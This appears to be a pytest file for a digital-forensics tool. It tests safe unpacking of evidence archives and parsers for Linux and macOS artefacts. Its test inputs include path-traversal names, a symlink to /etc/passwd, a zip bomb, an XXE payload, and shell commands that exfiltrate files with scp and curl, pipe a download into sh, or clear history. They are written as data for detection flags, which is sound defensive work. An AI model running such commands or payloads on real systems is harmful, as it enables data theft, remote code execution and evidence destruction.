"""Logical packages (unpacking that refuses unsafe names, links and bombs; times from ZIP extra fields and TAR headers;
file system roots of KAPE, Velociraptor and macOS layouts), Linux and macOS parsers, Plaso timeline files, APFS volume
ids and symbolic links in bodyfiles."""
import gzip
import io
import json
import plistlib
import sqlite3
import stat
import struct
import tarfile
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from app.forensic import apfs, packages, plaso_import, unix
from app.forensic.filesystem import parse_bodyfile_line
from app.forensic.source import package_source

UTC = timezone.utc


def _ntfs_extra(m: datetime, a: datetime, c: datetime) -> bytes:
    ft = lambda d: int((d.timestamp() + 11644473600) * 10_000_000)
    body = struct.pack('<I', 0) + struct.pack('<HH', 1, 24) + struct.pack('<QQQ', ft(m), ft(a), ft(c))
    return struct.pack('<HH', 0x000A, len(body)) + body


def test_zip_unpacking_is_safe_and_keeps_times(tmp_path):
    m, a, c = datetime(2026, 9, 1, 14, 15, 20, tzinfo=UTC), datetime(2026, 9, 2, 8, 0, tzinfo=UTC), datetime(2026, 8, 1, 9, 0, tzinfo=UTC)
    z = tmp_path / 'kape.zip'
    with zipfile.ZipFile(z, 'w') as f:
        info = zipfile.ZipInfo('2026-09-01T190512_PC/C/Windows/System32/config/SYSTEM')
        info.extra = _ntfs_extra(m, a, c)
        f.writestr(info, b'regf')
        f.writestr('2026-09-01T190512_PC/C/Users/alice/NTUSER.DAT', b'regf')  # a plain (local) ZIP time
        f.writestr('../../escape.txt', b'x')
        f.writestr('/abs.txt', b'x')
        f.writestr('C/Users/a/../../../up.txt', b'x')
        link = zipfile.ZipInfo('2026-09-01T190512_PC/C/Users/alice/link')
        link.external_attr = (stat.S_IFLNK | 0o777) << 16
        f.writestr(link, '/etc/passwd')
        f.writestr('2026-09-01T190512_PC/C/Users/alice/NTUSER.DAT', b'again')  # a second member of the same name
    dest = tmp_path / 'out' / 'EVID-1'
    info = packages.unpack(z, dest, 'ZIP')
    # Names that climb out (..) are refused; an absolute name is kept inside the package (its leading / dropped).
    assert (info['files'], info['skipped'], info['links']) == (3, 3, 1) and info['zip_local_times']
    assert not (tmp_path / 'escape.txt').exists() and not list(tmp_path.rglob('up.txt')) and (dest / 'abs.txt').read_bytes() == b'x'
    assert not (dest / '2026-09-01T190512_PC/C/Users/alice/link').exists()
    man = packages.read_manifest(info['manifest'])
    system = man['2026-09-01T190512_PC/C/Windows/System32/config/SYSTEM']
    assert (system['mtime'], system['atime'], system['crtime']) == (m.isoformat(), a.isoformat(), c.isoformat())
    assert 'mtime_local' in man['2026-09-01T190512_PC/C/Users/alice/NTUSER.DAT']
    assert (dest / '2026-09-01T190512_PC/C/Users/alice/NTUSER.DAT').read_bytes() == b'regf'  # the first one kept
    assert info['roots'] == [{'path': '2026-09-01T190512_PC/C', 'os': 'windows', 'label': 'C', 'volume_id': 'pkg'}]
    src = package_source({'package': {'roots': info['roots']}}, dest)
    assert src.find('pkg', '/windows/system32/CONFIG/system') == '/Windows/System32/config/SYSTEM'
    assert src.read_range(src_ref := __import__('app.forensic.source', fromlist=['BlobRef']).BlobRef('E', 'pkg', inode='/Windows/System32/config/SYSTEM'), 0, 4) == b'regf'


def test_archive_bombs_are_refused(tmp_path):
    z = tmp_path / 'bomb.zip'
    with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as f:
        info = zipfile.ZipInfo('C/Windows/zeros')
        info.compress_type = zipfile.ZIP_DEFLATED
        with f.open(info, 'w', force_zip64=True) as w:
            for _ in range(1100):
                w.write(bytes(1 << 20))
    with pytest.raises(packages.PackageError, match='archive bomb'):
        packages.unpack(z, tmp_path / 'x', 'ZIP')


def test_velociraptor_names_are_decoded(tmp_path):
    z = tmp_path / 'velo.zip'
    with zipfile.ZipFile(z, 'w') as f:
        info = zipfile.ZipInfo('uploads/auto/C%3A/Users/alice/AppData/Local/Temp/a%20b.txt')
        info.extra = struct.pack('<HHBi', 0x5455, 5, 1, int(datetime(2026, 9, 1, 12, tzinfo=UTC).timestamp()))
        f.writestr(info, b'x')
        f.writestr('uploads/auto/C%3A/Windows/win.ini', b'[fonts]')
        f.writestr('uploads.json', '{}')
    info = packages.unpack(z, tmp_path / 'v', 'ZIP')
    assert [r['path'] for r in info['roots']] == ['uploads/auto/C:']
    man = packages.read_manifest(info['manifest'])
    assert man['uploads/auto/C:/Users/alice/AppData/Local/Temp/a b.txt']['mtime'] == '2026-09-01T12:00:00+00:00'


def test_tar_packages_keep_links_and_find_macos(tmp_path):
    t = tmp_path / 'mac.tar'
    with tarfile.open(t, 'w', format=tarfile.PAX_FORMAT) as f:
        for name in ('Macintosh HD/Users/alice/.zsh_history', 'Macintosh HD/Library/Preferences/x.plist'):
            ti = tarfile.TarInfo(name)
            ti.size, ti.mtime = 2, 1788287712
            f.addfile(ti, io.BytesIO(b'ok'))
        ln = tarfile.TarInfo('Macintosh HD/private/etc/localtime')
        ln.type, ln.linkname = tarfile.SYMTYPE, '/var/db/timezone/zoneinfo/America/New_York'
        f.addfile(ln)
        dev = tarfile.TarInfo('Macintosh HD/dev/null')
        dev.type = tarfile.CHRTYPE
        f.addfile(dev)
    assert packages.archive_kind(t) == 'TAR'
    info = packages.unpack(t, tmp_path / 'm', 'TAR')
    assert (info['files'], info['links'], info['skipped']) == (2, 1, 1) and info['roots'][0]['os'] == 'macos'
    lines = [json.loads(x) for x in Path(info['manifest']).read_text().splitlines()]
    assert {'kind': 'link', 'path': 'Macintosh HD/private/etc/localtime', 'link_target': '/var/db/timezone/zoneinfo/America/New_York',
            'name': 'Macintosh HD/private/etc/localtime'} in lines
    assert unix.zone_from_link('/var/db/timezone/zoneinfo/America/New_York') == 'America/New_York'


def test_linux_accounts_history_and_jobs():
    users = {u['username']: u for u in unix.passwd(b'root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000:Alice,,,:/home/alice:/bin/bash\n'
                                                   b'toor:x:0:0::/root:/bin/sh\nwww-data:x:33:33::/var/www:/bin/bash\n',
                                                   b'sudo:x:27:alice\n', b'alice:$6$salt$hash:20321:0:99999:7:::\nroot:!:1:::::\n')}
    assert users['alice']['admin'] and users['alice']['password_state'] == 'set' and 'hash' not in json.dumps(users['alice'], default=str)
    assert [f['code'] for f in users['toor']['flags']] == ['UID0'] and [f['code'] for f in users['www-data']['flags']] == ['SYSTEM_SHELL']
    assert users['root']['password_state'] == 'locked' and users['alice']['password_last_set'] == datetime(2025, 8, 21, tzinfo=UTC)
    h = unix.shell_history(b'#1788285930\nls\n#1788286142\nscp a.csv x@203.0.113.50:/tmp/\nhistory -c\n', 'bash')
    assert [(c['command'], c['time'], [f['code'] for f in c['flags']]) for c in h] == [
        ('ls', datetime(2026, 9, 1, 18, 5, 30, tzinfo=UTC), []), ('scp a.csv x@203.0.113.50:/tmp/', datetime(2026, 9, 1, 18, 9, 2, tzinfo=UTC), ['EXFIL']),
        ('history -c', None, ['ANTI_FORENSICS'])]
    z = unix.shell_history(b': 1788287405:0;curl -T p.csv https://x.example/up\n: 1788287500:2;echo a\\\nb\ncrontab -l\n', 'zsh')
    assert [c['command'] for c in z] == ['curl -T p.csv https://x.example/up', 'echo a\nb', 'crontab -l'] and z[0]['flags'][0]['code'] == 'EXFIL'
    assert not z[2]['flags'] and unix.command_flags('crontab /tmp/x')[0]['code'] == 'PERSISTENCE'
    jobs = unix.crontab(b'SHELL=/bin/sh\n*/15 * * * * root /opt/.cache/sync.sh\n@reboot root /usr/bin/true\n', '/etc/cron.d/sync')
    assert [(j['schedule'], j['user'], j['command'], [f['code'] for f in j['flags']]) for j in jobs] == [
        ('*/15 * * * *', 'root', '/opt/.cache/sync.sh', ['SUSPICIOUS_COMMAND']), ('@reboot', 'root', '/usr/bin/true', [])]
    unit = unix.systemd_unit(b'[Unit]\nDescription=x\n[Service]\nExecStart=/bin/bash -c "curl http://x/s | sh"\n', '/etc/systemd/system/x.service', True)
    assert unit['enabled'] and unit['flags'][0]['code'] == 'SUSPICIOUS_COMMAND' and unit['user'] == 'root'
    agent = unix.launchd(plistlib.dumps({'Label': 'a', 'ProgramArguments': ['/Users/Shared/.h/h'], 'RunAtLoad': True}), '/Library/LaunchAgents/a.plist')
    assert (agent['name'], agent['schedule'], agent['flags'][0]['code']) == ('a', 'at load', 'SUSPICIOUS_COMMAND')


def test_syslog_times_and_rules():
    data = (b'Dec 31 23:59:58 h sshd[1]: Accepted publickey for alice from 198.51.100.23 port 5 ssh2: ED25519 SHA256:x\n'
            b'Jan  2 10:00:00 h sudo:    bob : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/id\n'
            b'Jan  2 10:00:01 h sshd[2]: pam_unix(sshd:session): session opened for user bob(uid=1001) by bob(uid=0)\n'
            b'Jan  2 10:00:02 h su: pam_unix(su:session): session opened for user root(uid=0) by bob(uid=1001)\n')
    rows = unix.log_lines(gzip.compress(data), 'auth.log.1.gz', 'America/New_York', datetime(2027, 1, 3, tzinfo=UTC))
    assert [(r['kind'], r['time']) for r in rows] == [('ssh_login', datetime(2027, 1, 1, 4, 59, 58, tzinfo=UTC)),  # December: the year before
                                                      ('sudo', datetime(2027, 1, 2, 15, 0, tzinfo=UTC)), ('su', datetime(2027, 1, 2, 15, 0, 2, tzinfo=UTC))]
    assert rows[0]['fields']['ip'] == '198.51.100.23' and rows[2]['fields']['target'] == 'root'
    rfc = b'2026-09-01T14:12:44.123456-04:00 h kernel: [ 1.2] usb 1-1: New USB device found, idVendor=0781, idProduct=5567, bcdDevice= 1.00\n'
    r = unix.log_lines(rfc, 'syslog', None, None)
    assert (r[0]['kind'], r[0]['time'], r[0]['fields']['bus']) == ('usb_connected', datetime(2026, 9, 1, 18, 12, 44, 123456, tzinfo=UTC), '1-1')


def test_utmp_records():
    def rec(typ, line, user, host, t):
        b = bytearray(384)
        struct.pack_into('<hxxi', b, 0, typ, 7)
        b[8:8 + len(line)], b[44:44 + len(user)], b[76:76 + len(host)] = line.encode(), user.encode(), host.encode()
        struct.pack_into('<ii', b, 340, t, 0)
        return bytes(b)
    data = rec(7, 'pts/0', 'alice', '198.51.100.23', 1788285912) + rec(8, 'pts/0', '', '', 1788287500) + rec(2, '~', 'reboot', '6.8', 1788267605)
    out = unix.utmp(data)
    assert [(r['kind'], r['user']) for r in out] == [('login', 'alice'), ('logout', 'alice'), ('boot', 'reboot')]
    assert out[0]['duration_seconds'] == 1588 and out[0]['logout'] == datetime(2026, 9, 1, 18, 31, 40, tzinfo=UTC)
    assert [r['kind'] for r in unix.utmp(rec(6, 'ssh:notty', 'root', '203.0.113.99', 1788285730), failed=True)] == ['failed_login']


def test_macos_records(tmp_path):
    q = tmp_path / 'q'
    db = sqlite3.connect(q)
    db.execute('CREATE TABLE LSQuarantineEvent (LSQuarantineEventIdentifier TEXT, LSQuarantineTimeStamp REAL, LSQuarantineAgentBundleIdentifier TEXT, '
               'LSQuarantineAgentName TEXT, LSQuarantineDataURLString TEXT, LSQuarantineSenderName TEXT, LSQuarantineSenderAddress TEXT, '
               'LSQuarantineTypeNumber INTEGER, LSQuarantineOriginTitle TEXT, LSQuarantineOriginURLString TEXT, LSQuarantineOriginAlias BLOB)')
    db.execute("INSERT INTO LSQuarantineEvent VALUES ('i', 810651859.0, 'com.apple.mail', 'Mail', NULL, NULL, 'x@y.example', 0, NULL, NULL, NULL)")
    db.commit()
    db.close()
    assert [(e['time'], e['agent'], e['sender']) for e in unix.quarantine(q)] == [(datetime(2026, 9, 9, 13, 4, 19, tzinfo=UTC), 'Mail', 'x@y.example')]
    wifi = plistlib.dumps({'wifi.network.ssid.Cafe': {'SSID': b'Cafe', 'JoinedByUserAt': datetime(2026, 9, 2, 15, 47, 31), 'AddedAt': datetime(2026, 9, 2)}},
                          fmt=plistlib.FMT_BINARY)
    assert [(n['ssid'], n['last_joined']) for n in unix.wifi_networks(wifi)] == [('Cafe', datetime(2026, 9, 2, 15, 47, 31, tzinfo=UTC))]
    xbel = (b'<?xml version="1.0"?><xbel xmlns:bookmark="http://www.freedesktop.org/standards/desktop-bookmarks">'
            b'<bookmark href="file:///home/alice/a%20b.csv" visited="2026-09-01T18:06:10Z"><info><metadata>'
            b'<bookmark:applications><bookmark:application name="LibreOffice Calc" exec="x" count="2"/></bookmark:applications></metadata></info></bookmark></xbel>')
    r = unix.recently_used(xbel)
    assert (r[0]['path'], r[0]['visited'], r[0]['applications'][0]['name']) == ('/home/alice/a b.csv', datetime(2026, 9, 1, 18, 6, 10, tzinfo=UTC), 'LibreOffice Calc')
    with pytest.raises(Exception):
        unix.recently_used(b'<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><xbel>&e;</xbel>')
    assert unix.tzif_posix(open('/usr/share/zoneinfo/America/New_York', 'rb').read()) == 'EST5EDT,M3.2.0,M11.1.0'


def test_plaso_files(tmp_path):
    j = tmp_path / 't.jsonl'
    j.write_text(json.dumps({'timestamp': 1788271200000000, 'timestamp_desc': 'Creation Time', 'parser': 'winevtx', 'message': 'Logon',
                             'display_name': 'OS:/x'}) + '\n' + json.dumps({'timestamp': 0, 'parser': 'winreg'}) + '\nnot json\n')
    assert plaso_import.detect(j) == 'json_line'
    rows = list(plaso_import.iter_events(j, 'json_line'))
    assert rows[0]['timestamp'] == datetime(2026, 9, 1, 14, 0, tzinfo=UTC) and rows[1]['timestamp'] is None and rows[2]['error']
    c = tmp_path / 't.csv'
    c.write_text(','.join(plaso_import.L2T_HEADER) + '\n09/01/2026,14:00:00,UTC,M...,FILE,OS,Content Modification Time,-,-,s,d,2,f,5,-,filestat,-\n'
                 '00/00/0000,--:--:--,-,M...,REG,R,T,-,-,s,d,2,f,-,-,winreg,-\n')
    assert plaso_import.detect(c) == 'l2tcsv'
    rows = list(plaso_import.iter_events(c, 'l2tcsv'))
    assert (rows[0]['timestamp'], rows[0]['parser'], rows[0]['macb']) == (datetime(2026, 9, 1, 14, tzinfo=UTC), 'filestat', 'M...') and rows[1]['timestamp'] is None
    bad = tmp_path / 'x.txt'
    bad.write_text('hello\n')
    with pytest.raises(plaso_import.TimelineError):
        plaso_import.detect(bad)


def test_apfs_ids_and_links():
    assert apfs.parse('p2048/apfs107') == (2048, 107) and apfs.parse('p2048') is None and apfs.volume_id(0, 107) == 'p0/apfs107'
    assert apfs.args('p0/apfs107') == ['-P', 'apfs', '-B', '107'] and apfs.args('p40/apfs9')[:2] == ['-o', '40']
    e = parse_bodyfile_line('0|/a_link -> /etc/passwd|20|l/lrwxrwxrwx|0|0|11|0|0|0|0')
    assert (e['path'], e['link_target']) == ('/a_link', '/etc/passwd')
    assert parse_bodyfile_line('0|/notes -> x.txt|21|r/rrw-r--r--|0|0|5|0|0|0|0')['path'] == '/notes -> x.txt'  # only links are split
